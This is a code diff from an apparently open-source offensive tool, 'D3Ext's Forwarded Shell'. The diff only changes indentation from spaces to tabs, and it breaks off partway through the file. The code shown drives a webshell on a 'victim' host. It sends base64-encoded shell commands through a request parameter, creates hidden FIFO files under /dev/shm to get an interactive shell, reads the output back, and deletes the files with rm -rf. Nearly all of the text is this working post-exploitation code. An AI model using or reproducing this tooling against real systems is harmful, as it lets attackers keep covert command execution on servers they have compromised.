@@ -33,51 +33,51 @@ outfile = f"/dev/shm/.fs/output.{mod}"
 
 # Colors
 class c:
-    PURPLE = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    END = '\033[0m'
-    UNDERLINE = '\033[4m'
+	PURPLE = '\033[95m'
+	BLUE = '\033[94m'
+	CYAN = '\033[96m'
+	GREEN = '\033[92m'
+	YELLOW = '\033[93m'
+	RED = '\033[91m'
+	END = '\033[0m'
+	UNDERLINE = '\033[4m'
 
 # Ctrl + C Function
 def exit_handler(sig, frame):
-    print(c.BLUE + "\n\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Interrupt handler received, exiting" + c.END)
-    removeFiles(url, parameter)
+	print(c.BLUE + "\n\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Interrupt handler received, exiting" + c.END)
+	removeFiles(url, parameter)
 	server.shutdown()
-    sys.exit(0)
+	sys.exit(0)
 
 signal.signal(signal.SIGINT, exit_handler)
 
 # Remove input and output files at the exit
 def removeFiles(url, parameter):
-    removeCommand = """rm -rf /dev/shm/.fs/"""
-    base64command = b64encode(removeCommand.encode()).decode()
+	removeCommand = """rm -rf /dev/shm/.fs/"""
+	base64command = b64encode(removeCommand.encode()).decode()
     
 	removeData = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
+		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+	}
     
-    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Removing created files\n" + c.END)
-    r = requests.post(url, data=removeData, timeout=2)
+	print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Removing created files\n" + c.END)
+	r = requests.post(url, data=removeData, timeout=2)
     
 # Argument Parser Function
 def parseArgs():
-    p = argparse.ArgumentParser(description="D3Ext's Forwarded Shell - Interactive TTY and more")
-    p.add_argument('-u', '--url', help="url of the webshell (Example: http://10.10.10.10/shell.php)", required=True)
-    p.add_argument('-p', '--parameter', help="parameter of the webshell to exec commands (Example: cmd)", required=True)
+	p = argparse.ArgumentParser(description="D3Ext's Forwarded Shell - Interactive TTY and more")
+	p.add_argument('-u', '--url', help="url of the webshell (Example: http://10.10.10.10/shell.php)", required=True)
+	p.add_argument('-p', '--parameter', help="parameter of the webshell to exec commands (Example: cmd)", required=True)
 
-    return p.parse_args()
+	return p.parse_args()
 
 # To check if the url receives the connections and requests
 def checkConn(url):
-    r = requests.get(url, timeout=5)
-    if r.status_code == 200:
-        print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection established succesfully" + c.END)
-    else:
-        print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Connection refused\n" + c.END)
+	r = requests.get(url, timeout=5)
+	if r.status_code == 200:
+		print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection established succesfully" + c.END)
+	else:
+		print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Connection refused\n" + c.END)
 		sys.exit(0)
 
 # To forward a port to your localhost
@@ -89,43 +89,43 @@ def createHttp():
 	
 # Function to create the fifos on the victim (to have an interactive tty)
 def createFifos(url, parameter):
-
+	
     # Create directory with the files in /dev/shm/.fs/
-    raw_command = f"""mkdir /dev/shm/.fs"""
-    base64command = b64encode(raw_command.encode()).decode()
+	raw_command = f"""mkdir /dev/shm/.fs"""
+	base64command = b64encode(raw_command.encode()).decode()
     
-    fifosData = {
-        f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
-    }
+	fifosData = {
+		f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
+	}
 
-    r = requests.post(url, data=fifosData)
+	r = requests.post(url, data=fifosData)
 
-    # Create input and output files under /tmp/.fs/
-    try:
-        raw_command = f"""mkfifo {infile}; tail -f {infile} | /bin/sh 2>&1 > {outfile}"""
-        base64command = b64encode(raw_command.encode()).decode()
+	# Create input and output files under /tmp/.fs/
+	try:
+		raw_command = f"""mkfifo {infile}; tail -f {infile} | /bin/sh 2>&1 > {outfile}"""
+		base64command = b64encode(raw_command.encode()).decode()
     
-        fifosData = {
-            f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
-        }
+		fifosData = {
+			f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
+		}
 
-        print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Creating fifos on target system..." + c.END)
-        r = requests.post(url, data=fifosData, timeout=2)
-    except:
-        None
-    return None
+		print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Creating fifos on target system..." + c.END)
+		r = requests.post(url, data=fifosData, timeout=2)
+	except:
+		None
+	return None
 
 # Function to read the file with the executed commands 
 def readCommand(url, parameter):
-    raw_command = f"""/bin/cat {outfile}"""
-    base64command = b64encode(raw_command.encode()).decode()
+	raw_command = f"""/bin/cat {outfile}"""
+	base64command = b64encode(raw_command.encode()).decode()
 
-    readData = {
-        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
-    }
+	readData = {
+		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
+	}
 
-    r = requests.post(url, data=readData, timeout=2)
-    return r.text
+	r = requests.post(url, data=readData, timeout=2)
+	return r.text
     
 # Function to clear the output file with every command
 def clearOutput(url, parameter):
